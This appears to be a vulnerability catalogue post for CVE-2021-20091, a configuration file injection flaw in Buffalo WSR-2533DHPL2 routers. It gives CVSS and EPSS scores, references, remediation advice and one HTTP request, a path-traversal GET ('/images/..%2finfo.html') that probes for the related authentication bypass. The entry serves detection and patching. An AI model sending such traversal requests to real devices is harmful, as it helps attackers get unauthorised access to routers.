---
layout: post
cve_id: CVE-2021-20091
title: Buffalo WSR-2533DHPL2 - Configuration File Injection
pcap: true
pcap_path: /pcaps/2021/CVE-2021-20091.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2021/CVE-2021-20091.yaml
snort2_rule: N/A
snort3_rule: N/A
author: gy741,pdteam,parth
severity: high
impact: 'An attacker can exploit this vulnerability to inject malicious configuration
  settings, potentially leading to unauthorized access or control of the router.

  '
remediation: 'Apply the latest firmware update provided by Buffalo to fix the configuration
  file injection vulnerability.

  '
reference:
- https://blogs.juniper.net/en-us/security/freshly-disclosed-vulnerability-cve-2021-20090-exploited-in-the-wild
- https://www.tenable.com/security/research/tra-2021-13
- https://medium.com/tenable-techblog/bypassing-authentication-on-arcadyan-routers-with-cve-2021-20090-and-rooting-some-buffalo-ea1dd30980c2
- https://nvd.nist.gov/vuln/detail/CVE-2021-20091
- https://github.com/ARPSyndicate/cvemon
classification:
  cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H
  cvss-score: 8.8
  cve-id: CVE-2021-20091
  epss-score: 0.8599
  epss-percentile: 0.9936
  cpe: cpe:2.3:h:buffalo:wsr-2533dhpl2-bk:-:*:*:*:*:*:*:*
metadata:
  max-request: 2
  vendor: buffalo
  product: wsr-2533dhpl2-bk
tags:
- cve2021
- cve
- buffalo
- firmware
- iot
- tenable
- vkev
- vuln
---

## üîç Vulnerability Description
The web interfaces of Buffalo WSR-2533DHPL2 firmware version <= 1.02 and WSR-2533DHP3 firmware version <= 1.24 does not properly sanitize user input. An authenticated remote attacker could leverage this vulnerability to alter device configuration, potentially leading to remote code execution.


## üåê HTTP Request
```nohighlight
GET /images/..%2finfo.html HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36
Connection: close
Referer: http://www.victim.com/info.html
Accept-Encoding: gzip
```

